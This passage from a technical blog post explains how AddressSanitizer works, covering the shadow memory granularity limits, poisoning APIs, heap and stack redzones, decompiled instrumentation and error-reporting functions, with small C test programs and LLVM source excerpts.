*)((<span class="hljs-keyword">char</span> *)x + <span class="hljs-number">6</span>);    <span class="hljs-comment">// [6, 9]</span>    *y = <span class="hljs-number">1</span>;                             <span class="hljs-comment">// OOB</span>    <span class="hljs-keyword">delete</span>[] x;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>Although this is clearly an out-of-bounds access, ASAN does not detect it due to the 8:1 mapping granularity.</p><p>To address such cases, it is recommended to enable additional sanitizers such as <code>-fsanitize=alignment</code>, which is part of Undefined Behavior Sanitizer (UBSan).</p><p><img src="/2025/12/25/millet/asan-pt1-en/image5.png" alt></p><p>Because the shadow memory is mapped at an 8:1 ratio, the result of the expression</p><p><code>(v4 + 6) &gt;&gt; 3</code> eventually becomes identical to <code>v4 &gt;&gt; 3</code>.</p><p>As a result, the same shadow memory byte is checked, which prevents ASan from detecting the out-of-bounds access.</p><p>Due to this structural limitation, memory accesses that cross misaligned boundaries may not be properly detected by ASan.</p><p>Reducing the mapping scale would allow stricter checks, but doing so would introduce inefficiencies in vectorized instructions and deviate from ASAN&#x2019;s original design assumptions. For these reasons, the recommended approach is to apply an additional sanitizer that explicitly checks alignment violations, such as <code>-fsanitize=alignment</code>. This option is part of Undefined Behavior Sanitizer (UBSan).</p><p>When rebuilding the program with the <code>-fsanitize=alignment</code> option enabled, the out-of-bounds access is correctly detected.</p><pre><code class="hljs bash">$ g++ oob.cpp -o oob_aligned -fsanitize=address -fsanitize=alignment$ ./oob_alignedoob.cpp:7:8: runtime error: store to misaligned address 0x502000000016 <span class="hljs-keyword">for</span> <span class="hljs-built_in">type</span> <span class="hljs-string">&apos;int&apos;</span>, <span class="hljs-built_in">which</span> requires 4 byte alignment0x502000000016: note: pointer points here be be be be be be  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  00 00             ^</code></pre><p>Examining the resulting binary shows that UBSan has inserted additional type-based checking functions. This topic will be covered in more detail in a future article.</p><p><img src="/2025/12/25/millet/asan-pt1-en/image6.png" alt></p><h3 id="2-2-Poisoning-Unpoisoning"><a href="#2-2-Poisoning-Unpoisoning" class="headerlink" title="2.2 Poisoning / Unpoisoning"></a>2.2 Poisoning / Unpoisoning</h3><p>Shadow memory stores one byte of metadata per 8 bytes of application memory. ASan interprets this byte using several predefined values to represent memory accessibility.</p><p>Accessible memory is referred to as <strong>unpoisoned</strong>, while inaccessible memory is <strong>poisoned</strong>. Read and write accesses are not distinguished at this level.</p><div class="table-container"><table><thead><tr><th>Shadow Byte</th><th>Meaning</th><th>State</th></tr></thead><tbody><tr><td><code>0</code></td><td>All 8 bytes accessible</td><td>unpoison</td></tr><tr><td><code>&lt; 0</code></td><td>All 8 bytes inaccessible</td><td>poison</td></tr><tr><td><code>k (1~7)</code></td><td>First <code>k</code> bytes accessible</td><td>&#xBD80;&#xBD84; unpoison</td></tr></tbody></table></div><p>At process startup, shadow memory is initialized as poisoned. Known memory regions are unpoisoned before entering <code>main</code>.</p><p>It can be summarized in a table as follows.</p><div class="table-container"><table><thead><tr><th>Region</th><th>Initialized before main thread execution</th><th>Modified during process execution</th></tr></thead><tbody><tr><td>Global / static variables</td><td>O (unpoison)</td><td>X</td></tr><tr><td>Stack frame (main)</td><td>O (partially unpoison)</td><td>Updated on function call and return</td></tr><tr><td>Heap</td><td>X (poison)</td><td>Managed by dedicated interceptor functions</td></tr><tr><td>TLS</td><td>O (unpoison)</td><td>X</td></tr></tbody></table></div><p>Dynamic heap memory is managed via interceptor functions inserted by ASan, such as wrapped versions of <code>malloc</code> and <code>free</code>.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/interception/interception.h</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> INTERCEPTOR(ret_type, func, ...)        \</span>  DEFINE_REAL(ret_type, func, __VA_ARGS__)      \  DECLARE_WRAPPER(ret_type, func, __VA_ARGS__)  \  <span class="hljs-keyword">extern</span> <span class="hljs-string">&quot;C&quot;</span> <span class="hljs-function">INTERCEPTOR_ATTRIBUTE ret_type <span class="hljs-title">WRAP</span><span class="hljs-params">(func)</span><span class="hljs-params">(__VA_ARGS__)</span></span></code></pre><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_malloc_linux.cpp</strong></p></blockquote><pre><code class="hljs c">...INTERCEPTOR(<span class="hljs-keyword">void</span>, <span class="hljs-built_in">free</span>, <span class="hljs-keyword">void</span> *ptr) {  <span class="hljs-keyword">if</span> (DlsymAlloc::PointerIsMine(ptr))    <span class="hljs-keyword">return</span> DlsymAlloc::Free(ptr);  GET_STACK_TRACE_FREE;  asan_free(ptr, &amp;<span class="hljs-built_in">stack</span>);}...INTERCEPTOR(<span class="hljs-keyword">void</span>*, <span class="hljs-built_in">malloc</span>, uptr size) {  <span class="hljs-keyword">if</span> (DlsymAlloc::Use())    <span class="hljs-keyword">return</span> DlsymAlloc::Allocate(size);  GET_STACK_TRACE_MALLOC;  <span class="hljs-keyword">return</span> asan_malloc(size, &amp;<span class="hljs-built_in">stack</span>);}...</code></pre><p>ASan also provides explicit APIs to poison or unpoison memory regions.</p><blockquote><p><strong>llvm-project/compiler-rt/include/sanitizer/asan_interface.h</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">if</span> __has_feature(address_sanitizer) || defined(__SANITIZE_ADDRESS__)</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ASAN_POISON_MEMORY_REGION(addr, size) \</span>  __asan_poison_memory_region((addr), (size))<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ASAN_UNPOISON_MEMORY_REGION(addr, size) \</span>  __asan_unpoison_memory_region((addr), (size))<span class="hljs-meta">#<span class="hljs-meta-keyword">else</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ASAN_POISON_MEMORY_REGION(addr, size) \</span>  ((<span class="hljs-keyword">void</span>)(addr), (<span class="hljs-keyword">void</span>)(size))<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> ASAN_UNPOISON_MEMORY_REGION(addr, size) \</span>  ((<span class="hljs-keyword">void</span>)(addr), (<span class="hljs-keyword">void</span>)(size))<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> </span></code></pre><p>Explicit poisoning can be enabled or disabled through runtime flags.</p><pre><code class="hljs bash">ASAN_OPTIONS=allow_user_poisoning=0</code></pre><p>These can be useful for enforcing custom memory lifetimes. Let us verify this behavior using an example program.</p><pre><code class="hljs c"><span class="hljs-comment">// g++ unpoison.cpp -o unpoison -fsanitize=address</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sanitizer/asan_interface.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">cus_alloc</span><span class="hljs-params">(<span class="hljs-keyword">size_t</span> size)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">void</span> *p = <span class="hljs-built_in">malloc</span>(size);    ASAN_POISON_MEMORY_REGION(p, size);    <span class="hljs-keyword">return</span> p;}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">activate_p</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *p, <span class="hljs-keyword">size_t</span> size)</span></span><span class="hljs-function"></span>{    ASAN_UNPOISON_MEMORY_REGION(p, size);}<span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">char</span> *p = (<span class="hljs-keyword">char</span> *)cus_alloc(<span class="hljs-number">8</span>);    activate_p(p, <span class="hljs-number">6</span>);    <span class="hljs-built_in">strcpy</span>(p, <span class="hljs-string">&quot;millet&quot;</span>);    <span class="hljs-built_in">puts</span>(p);    <span class="hljs-built_in">free</span>(p);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>In ASan, the redefined <code>malloc()</code> function manages newly allocated memory as unpoisoned by default. In this example, the memory region is first marked as inaccessible using <code>ASAN_POISON_MEMORY_REGION</code>, and then explicitly unpoisoned only when it is actually used. This approach provides an additional layer of safety in memory management.</p><p>If the memory is not explicitly unpoisoned, the program terminates with an error as shown below.</p><pre><code class="hljs bash">./unpoison===================================================================1381294==ERROR: AddressSanitizer: use-after-poison on address 0x502000000010 at pc 0x7f0804f052c3 bp 0x7ffcc58dca60 sp 0x7ffcc58dc208WRITE of size 7 at 0x502000000010 thread T0    <span class="hljs-comment">#0 0x7f0804f052c2 in __interceptor_memcpy ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827</span>    <span class="hljs-comment">#1 0x55577d55a300 in main (/root/asan/unpoison+0x1300)</span>    <span class="hljs-comment">#2 0x7f0804998d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span>    <span class="hljs-comment">#3 0x7f0804998e3f in __libc_start_main_impl ../csu/libc-start.c:392</span>    <span class="hljs-comment">#4 0x55577d55a1a4 in _start (/root/asan/unpoison+0x11a4)</span>0x502000000010 is located 0 bytes inside of 8-byte region [0x502000000010,0x502000000018)allocated by thread T0 here:    <span class="hljs-comment">#0 0x7f0804f7f887 in __interceptor_malloc ../../../../src/libsanitizer/asan/asan_malloc_linux.cpp:145</span>    <span class="hljs-comment">#1 0x55577d55a284 in cus_alloc(unsigned long) (/root/asan/unpoison+0x1284)</span>    <span class="hljs-comment">#2 0x55577d55a2e1 in main (/root/asan/unpoison+0x12e1)</span>    <span class="hljs-comment">#3 0x7f0804998d8f in __libc_start_call_main ../sysdeps/nptl/libc_start_call_main.h:58</span>SUMMARY: AddressSanitizer: use-after-poison ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:827 <span class="hljs-keyword">in</span> __interceptor_memcpyShadow bytes around the buggy address:  0x0a047fff7fb0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x0a047fff7fc0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x0a047fff7fd0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x0a047fff7fe0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  0x0a047fff7ff0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00=&gt;0x0a047fff8000: fa fa[f7]fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8010: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8020: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8030: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8040: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  0x0a047fff8050: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa faShadow byte legend (one shadow byte represents 8 application bytes):  Addressable:           00  Partially addressable: 01 02 03 04 05 06 07   Heap left redzone:       fa  Freed heap region:       fd  Stack left redzone:      f1  Stack mid redzone:       f2  Stack right redzone:     f3  Stack after <span class="hljs-built_in">return</span>:      f5  Stack use after scope:   f8  Global redzone:          f9  Global init order:       f6  Poisoned by user:        f7  Container overflow:      <span class="hljs-built_in">fc</span>  Array cookie:            ac  Intra object redzone:    bb  ASan internal:           fe  Left alloca redzone:     ca  Right alloca redzone:    cb  Shadow gap:              cc==1381294==ABORTING</code></pre><p>It clearly reports the issue as a <strong>use-after-poison</strong> error.</p><h3 id="2-3-Redzone"><a href="#2-3-Redzone" class="headerlink" title="2.3 Redzone"></a>2.3 Redzone</h3><p>While poisoning tracks memory lifetime, redzones protect boundaries around memory objects. Redzones are regions of memory placed around the actual usable area of a memory object where access is explicitly forbidden.</p><p><img src="/2025/12/25/millet/asan-pt1-en/image7.png" alt></p><p>Regions designated as redzones are always kept in a poisoned state. As a result, any read or write that crosses a boundary, or any logically invalid access, ends up touching a redzone, allowing ASan to detect heap buffer overflows or stack buffer overflows.</p><p>Redzones are primarily placed around heap, stack, and global buffers, and all of them are represented as poisoned regions in shadow memory.</p><div class="table-container"><table><thead><tr><th>Shadow Byte</th><th>Meaning</th><th>State</th></tr></thead><tbody><tr><td><code>0xfa</code></td><td>Heap left redzone</td><td>poison</td></tr><tr><td><code>0xf1</code></td><td>Stack left redzone</td><td>poison</td></tr><tr><td><code>0xf2</code></td><td>Stack mid redzone</td><td>poison</td></tr><tr><td><code>0xf3</code></td><td>Stack right redzone</td><td>poison</td></tr><tr><td><code>0xf5</code></td><td>Stack after return</td><td>poison</td></tr><tr><td><code>0xf9</code></td><td>Global redzone</td><td>poison</td></tr><tr><td><code>0xca</code></td><td>Left alloca redzone</td><td>poison</td></tr><tr><td><code>0xcb</code></td><td>Right alloca redzone</td><td>poison</td></tr></tbody></table></div><p>Let us examine an example to observe the redzones inserted around heap allocations.</p><pre><code class="hljs c"><span class="hljs-comment">// g++ redzone.cpp -o redzone -fsanitize=address</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">char</span> *p = (<span class="hljs-keyword">char</span> *)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">6</span>);    p[<span class="hljs-number">6</span>] = <span class="hljs-string">&apos;m&apos;</span>;    <span class="hljs-built_in">free</span>(p);    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>In an x86-64 environment, ptmalloc2 allocates memory in 16-byte&#x2013;aligned chunks.</p><p>When <code>malloc(6)</code> is called, ptmalloc2 actually allocates a total of 32 bytes.</p><p>Except for the 6 bytes of user data, the remaining space must not be accessed.</p><pre><code class="hljs bash">...   0x5555555551d1 &lt;main+0008&gt;      sub    rsp, 0x10   0x5555555551d5 &lt;main+000c&gt;      mov    edi, 0x6   0x5555555551da &lt;main+0011&gt;      call   0x5555555550b0 &lt;malloc@plt&gt; &#x2192; 0x5555555551df &lt;main+0016&gt;      mov    QWORD PTR [rbp-0x8], rax...gef&#x27A4;  x/4bx ((<span class="hljs-variable">$rax</span> &gt;&gt; 3) + 0x7fff8000) - 20xa047fff8000:  0xfa    0xfa    0x06    0xfa</code></pre><p>After the memory allocation, the state appears as shown above. Only the shadow byte corresponding to the actually usable region is set to <code>0x06</code>, while the remaining bytes are set to <code>0xfa</code>, which represents the heap left redzone.</p><p>Therefore, the following conditional check detects the invalid memory access.</p><p><img src="/2025/12/25/millet/asan-pt1-en/image8.png" alt></p><p>This time, let us examine a stack buffer overflow using an example.</p><pre><code class="hljs c"><span class="hljs-comment">// g++ redzone.cpp -o redzone -fsanitize=address</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><span class="hljs-function"></span>{    <span class="hljs-keyword">char</span> sp[<span class="hljs-number">16</span>] = {<span class="hljs-number">0</span>, };    sp[<span class="hljs-number">17</span>] = <span class="hljs-string">&apos;i&apos;</span>;    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>After compilation, the <code>main()</code> function rewritten by ASan appears as follows.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> __fastcall <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **argv, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> **envp)</span></span><span class="hljs-function"></span>{  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// rbx</span>  __int64 v4; <span class="hljs-comment">// rax</span>  _BYTE *v5; <span class="hljs-comment">// rdx</span>  __int64 v6; <span class="hljs-comment">// rax</span>  <span class="hljs-keyword">char</span> v7; <span class="hljs-comment">// si</span>  _BYTE v9[<span class="hljs-number">88</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-70h] BYREF</span>  <span class="hljs-keyword">unsigned</span> __int64 cnry; <span class="hljs-comment">// [rsp+58h] [rbp-18h]</span>  v3 = (<span class="hljs-keyword">unsigned</span> __int64)v9;  <span class="hljs-keyword">if</span> ( _TMC_END__ )  {    v4 = __asan_stack_malloc_0(<span class="hljs-number">64</span>, argv, envp);    <span class="hljs-keyword">if</span> ( v4 )      v3 = v4;  }  v5 = (_BYTE *)(v3 + <span class="hljs-number">0x60</span>);  *(_QWORD *)v3 = <span class="hljs-number">0x41B58AB3</span>;  *(_QWORD *)(v3 + <span class="hljs-number">8</span>) = <span class="hljs-string">&quot;1 32 16 4 sp:5&quot;</span>;  *(_QWORD *)(v3 + <span class="hljs-number">16</span>) = main;  v6 = v3 &gt;&gt; <span class="hljs-number">3</span>;  *(_DWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0xF1F1F1F1</span>;  *(_DWORD *)(v6 + <span class="hljs-number">0x7FFF8004</span>) = <span class="hljs-number">0xF3F30000</span>;  cnry = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">if</span> ( *(_WORD *)(((v3 + <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7FFF8000</span>) )    v6 = __asan_report_store16(v3 + <span class="hljs-number">32</span>);  *((_QWORD *)v5 - <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;  *((_QWORD *)v5 - <span class="hljs-number">7</span>) = <span class="hljs-number">0</span>;  v7 = *(_BYTE *)(((<span class="hljs-keyword">unsigned</span> __int64)(v5 - <span class="hljs-number">47</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7FFF8000</span>);  <span class="hljs-keyword">if</span> ( v7 != <span class="hljs-number">0</span> &amp;&amp; (((<span class="hljs-keyword">unsigned</span> __int8)v5 - <span class="hljs-number">64</span> + <span class="hljs-number">17</span>) &amp; <span class="hljs-number">7</span>) &gt;= v7 )    v6 = __asan_report_store1(v5 - <span class="hljs-number">47</span>);  *(v5 - <span class="hljs-number">47</span>) = <span class="hljs-string">&apos;i&apos;</span>;  <span class="hljs-keyword">if</span> ( v9 == (_BYTE *)v3 )  {    *(_QWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span>  {    *(_QWORD *)v3 = <span class="hljs-number">0x45E0360E</span>;    *(_QWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0xF5F5F5F5F5F5F5F5</span>LL;    **(_BYTE **)(v3 + <span class="hljs-number">0x38</span>) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><p>Wow&#x2026; quite a lot of code has been inserted.</p><p>It may look complex at first glance, but if we apply the concepts discussed earlier, it is not particularly difficult to understand. Let us break it down step by step.</p><p><strong>ASan Stack Frame Setup</strong></p><p><code>v9</code> represents the top of the stack frame buffer set up by the compiler. To allow ASan to manage this stack frame, its value is moved into the variable <code>v3</code>.</p><pre><code class="hljs c">v3 = (<span class="hljs-keyword">unsigned</span> __int64)v9;<span class="hljs-keyword">if</span> ( _TMC_END__ ){  v4 = __asan_stack_malloc_0(<span class="hljs-number">64</span>, argv, envp);  <span class="hljs-keyword">if</span> ( v4 )    v3 = v4;}</code></pre><ul><li>There is logic that checks the value <code>_TMC_END__</code> and reallocates the stack. This behavior is controlled by the <code>ASAN_OPTIONS=detect_stack_use_after_return</code> option, which is used to detect stack reuse after a function has returned.</li></ul><p><img src="/2025/12/25/millet/asan-pt1-en/image9.png" alt></p><p><strong>Stack Frame Metadata Recording</strong></p><p>This code records separate metadata for the stack frame. Here, it stores information such as the current state of the stack frame and the intended layout of objects within the frame.</p><pre><code class="hljs c">v5 = (_BYTE *)(v3 + <span class="hljs-number">0x60</span>);*(_QWORD *)v3 = <span class="hljs-number">0x41B58AB3</span>;*(_QWORD *)(v3 + <span class="hljs-number">8</span>) = <span class="hljs-string">&quot;1 32 16 4 sp:5&quot;</span>;*(_QWORD *)(v3 + <span class="hljs-number">16</span>) = main;</code></pre><ul><li><p><code>0x41B58AB3</code>: A magic number used to identify the stack frame. In this context, it indicates that the stack frame is valid.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_internal.h</strong></p></blockquote>  <pre><code class="hljs c"><span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> uptr kCurrentStackFrameMagic = <span class="hljs-number">0x41B58AB3</span>;<span class="hljs-keyword">static</span> <span class="hljs-keyword">const</span> uptr kRetiredStackFrameMagic = <span class="hljs-number">0x45E0360E</span>;</code></pre></li><li><p><code>&quot;1 32 16 4 sp:5&quot;</code>: one stack object, offset 32, size 16, internal name sp:5</p></li><li><code>main</code>: records which function this stack frame belongs to</li></ul><p><strong>Stack Redzone Setup</strong></p><p>After unpoisoning the two shadow bytes corresponding to the 16 bytes that will actually be used, the regions on both sides are set as the stack left redzone and the stack right redzone, respectively.</p><pre><code class="hljs c">v6 = v3 &gt;&gt; <span class="hljs-number">3</span>;*(_DWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0xF1F1F1F1</span>;*(_DWORD *)(v6 + <span class="hljs-number">0x7FFF8004</span>) = <span class="hljs-number">0xF3F30000</span>;</code></pre><p><strong>Pre-access Check &#x2192; Access Logic</strong></p><p>This part follows the same shadow memory check mechanism discussed earlier.</p><p>Here, the check begins at the <code>+32</code> offset, which matches the information recorded in the stack frame metadata.</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> ( *(_WORD *)(((v3 + <span class="hljs-number">32</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7FFF8000</span>) )  v6 = __asan_report_store16(v3 + <span class="hljs-number">32</span>);*((_QWORD *)v5 - <span class="hljs-number">8</span>) = <span class="hljs-number">0</span>;*((_QWORD *)v5 - <span class="hljs-number">7</span>) = <span class="hljs-number">0</span>;v7 = *(_BYTE *)(((<span class="hljs-keyword">unsigned</span> __int64)(v5 - <span class="hljs-number">47</span>) &gt;&gt; <span class="hljs-number">3</span>) + <span class="hljs-number">0x7FFF8000</span>);<span class="hljs-keyword">if</span> ( v7 != <span class="hljs-number">0</span> &amp;&amp; (((<span class="hljs-keyword">unsigned</span> __int8)v5 - <span class="hljs-number">64</span> + <span class="hljs-number">17</span>) &amp; <span class="hljs-number">7</span>) &gt;= v7 )  v6 = __asan_report_store1(v5 - <span class="hljs-number">47</span>);*(v5 - <span class="hljs-number">47</span>) = <span class="hljs-string">&apos;i&apos;</span>;</code></pre><p>Although the operations may look complex, it ultimately becomes clear that the access targets the <code>+32</code> offset where the array is located. </p><p>(The <code>__asan_report_storeX()</code> functions will be examined in the next section.)</p><p><strong>Cleanup Before Function Return</strong></p><p>If <code>v9</code> and <code>v3</code> point to the same address, this indicates that the frame resides on the real stack, and the corresponding region is unpoisoned to allow subsequent function calls.</p><p>Otherwise, the frame was allocated on ASan&#x2019;s fake stack. In this case, the magic number is changed to <code>0x45E0360E</code>, which corresponds to <code>kRetiredStackFrameMagic</code>, and the region is poisoned with <code>0xf5</code>, representing <em>stack after return</em>. </p><p>With the underlying concepts in mind, the code becomes much easier to understand.</p><pre><code class="hljs c">  <span class="hljs-keyword">if</span> ( v9 == (_BYTE *)v3 )  {    *(_QWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">else</span>  {    *(_QWORD *)v3 = <span class="hljs-number">0x45E0360E</span>;    *(_QWORD *)(v6 + <span class="hljs-number">0x7FFF8000</span>) = <span class="hljs-number">0xF5F5F5F5F5F5F5F5</span>LL;    **(_BYTE **)(v3 + <span class="hljs-number">0x38</span>) = <span class="hljs-number">0</span>;  }  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;}</code></pre><h2 id="3-Error-Reporting"><a href="#3-Error-Reporting" class="headerlink" title="3. Error Reporting"></a>3. Error Reporting</h2><h3 id="3-1-Error-Reporting-Functions"><a href="#3-1-Error-Reporting-Functions" class="headerlink" title="3.1 Error Reporting Functions"></a>3.1 Error Reporting Functions</h3><p>When a check in the instrumentation logic fails, the following reporting functions are invoked.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan_abi_asan_abi_shim.cpp</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-comment">// Functions concerning memory load and store reporting</span><span class="hljs-keyword">void</span> __asan_report_load1(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load2(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">2</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load4(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load8(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load16(uptr addr) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">16</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_load_n(uptr addr, uptr size) {  __asan_abi_report_load_n((<span class="hljs-keyword">void</span> *)addr, size, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store1(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">1</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store2(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">2</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store4(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">4</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store8(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">8</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store16(uptr addr) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, <span class="hljs-number">16</span>, <span class="hljs-literal">true</span>);}<span class="hljs-keyword">void</span> __asan_report_store_n(uptr addr, uptr size) {  __asan_abi_report_store_n((<span class="hljs-keyword">void</span> *)addr, size, <span class="hljs-literal">true</span>);}</code></pre><p>As the names suggest, reads are labeled as <code>load</code>, writes as <code>store</code>, and the suffix indicates the number of bytes accessed.</p><p>The wrapped functions <code>__asan_abi_report_XXX_n</code> ultimately invoke the <code>ReportGenericError()</code> function.</p><blockquote><p><strong>llvm-project/compiler-rt/lib/asan/asan_report.cpp</strong></p></blockquote><pre><code class="hljs c"><span class="hljs-keyword">void</span> __asan_report_error(uptr pc, uptr bp, uptr sp, uptr addr, <span class="hljs-keyword">int</span> is_write,                         uptr access_size, u32 <span class="hljs-built_in">exp</span>) {  ENABLE_FRAME_POINTER;  <span class="hljs-keyword">bool</span> fatal = flags()-&gt;halt_on_error;  ReportGenericError(pc, bp, sp, addr, is_write, access_size, <span class="hljs-built_in">exp</span>, fatal);}<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">ReportGenericError</span><span class="hljs-params">(uptr pc, uptr bp, uptr sp, uptr addr, <span class="hljs-keyword">bool</span> is_write,</span></span><span class="hljs-function"><span class="hljs-params">                        uptr access_size, u32 <span class="hljs-built_in">exp</span>, <span class="hljs-keyword">bool</span> fatal)</span> </span>{  <span class="hljs-keyword">if</span> (__asan_test_only_reported_buggy_pointer) {    *__asan_test_only_reported_buggy_pointer = addr;    <span class="hljs-keyword">return</span>;  }  <span class="hljs-keyword">if</span> (!fatal &amp;&amp; SuppressErrorReport(pc)) <span class="hljs-keyword">return</span>;  ENABLE_FRAME_POINTER;  <span class="hljs-comment">// Optimization experiments.</span>  <span class="hljs-comment">// The experiments can be used to evaluate potential optimizations that remove</span>  <span class="hljs-comment">// instrumentation (assess false negatives). Instead of completely removing</span>  <span class="hljs-comment">// some instrumentation, compiler can emit special calls into runtime</span>  <span class="hljs-comment">// (e.g. __asan_report_exp_load1 instead of __asan_report_load1) and pass</span>  <span class="hljs-comment">// mask of experiments (exp).</span>  <span class="hljs-comment">// The reaction to a non-zero value of exp is to be defined.</span>  (<span class="hljs-keyword">void</span>)<span class="hljs-built_in">exp</span>;  <span class="hljs-function">ScopedInErrorReport <span class="hljs-title">in_report</span><span class="hljs-params">(fatal)</span></span>;  <span class="hljs-function">ErrorGeneric <span class="hljs-title">error</span><span class="hljs-params">(GetCurrentTidOrInvalid(), pc, bp, sp, addr, is_write,</span></span><span class="hljs-function"><span class="hljs-params">                     access_size)</span></span>;  in_report.ReportError(error);}</code></pre><p>The <code>fatal</code> value determines whether the program terminates after 